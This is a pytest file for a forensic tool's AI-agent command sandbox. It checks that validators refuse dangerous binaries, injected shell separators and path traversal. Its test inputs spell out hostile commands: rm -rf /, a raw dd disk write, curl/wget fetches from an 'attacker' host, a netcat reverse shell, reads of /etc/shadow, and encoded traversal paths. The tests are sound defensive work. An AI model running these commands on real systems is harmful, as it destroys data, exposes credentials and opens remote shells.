"""Adversarial guardrail bypass suite.

The FIND EVIL! rubric (Constraint Implementation) explicitly scores whether guardrails are
enforced ARCHITECTURALLY and were TESTED FOR BYPASS. Every attempt below must be refused
in Python - before any subprocess runs - proving the boundary is structural, not a prompt
the model could be talked out of.
"""
from __future__ import annotations

import pytest

from sift_hunter.core.exceptions import (
    CommandInjectionError,
    PathTraversalError,
    UnauthorizedBinaryError,
)
from sift_hunter.mcp_server.security.command_sanitizer import sanitize_args, validate_command
from sift_hunter.mcp_server.security.path_validator import validate_path

ROOTS = ["/cases"]


@pytest.mark.parametrize(
    "binary,args",
    [
        ("rm", ["-rf", "/cases/evidence"]),          # destructive
        ("/usr/bin/rm", ["-rf", "/"]),               # path-prefixed blocked binary
        ("dd", ["if=/dev/sda", "of=/tmp/x"]),        # raw disk write
        ("wget", ["http://attacker/x"]),             # network egress
        ("curl", ["-O", "http://attacker/x"]),       # network egress
        ("bash", ["-c", "cat /etc/shadow"]),         # shell spawn
        ("sh", ["-c", "id"]),                        # shell spawn
        ("python", ["-c", "import os; os.system('id')"]),  # interpreter spawn
        ("nc", ["-e", "/bin/sh", "attacker", "4444"]),     # reverse shell
        ("totally_unknown_tool", ["--go"]),          # not on the allowlist
    ],
)
def test_dangerous_or_unlisted_binaries_are_refused(binary, args):
    with pytest.raises(UnauthorizedBinaryError):
        validate_command(binary, args)


def test_command_chaining_smuggled_in_arg_is_blocked():
    # An allowlisted forensic tool, but a destructive command chained into an argument.
    with pytest.raises(CommandInjectionError):
        validate_command("vol3", ["-f", "mem.dmp; rm -rf /"])


def test_sanitize_args_rejects_shell_separator():
    with pytest.raises(CommandInjectionError):
        sanitize_args(["evidence.raw; whoami"])


@pytest.mark.parametrize(
    "path",
    [
        "../../etc/shadow",                  # relative traversal
        "/cases/../../etc/passwd",           # traversal out of an allowed root
        "evidence/..%2f..%2fetc/passwd",     # URL-encoded traversal
        "/etc/shadow",                       # outside allowed roots
        "/dev/mem",                          # device file
        "/proc/1/mem",                       # proc filesystem
        "",                                  # empty
    ],
)
def test_path_traversal_and_sensitive_paths_blocked(path):
    with pytest.raises(PathTraversalError):
        validate_path(path, ROOTS)


def test_legitimate_command_and_path_still_pass():
    # Control: the guardrails are precise, not "block everything".
    resolved, args = validate_command("vol3", ["-f", "/cases/mem.raw", "windows.pslist.PsList"])
    assert "vol3" in resolved
    assert validate_path("/cases/disk.dd", ROOTS).name == "disk.dd"
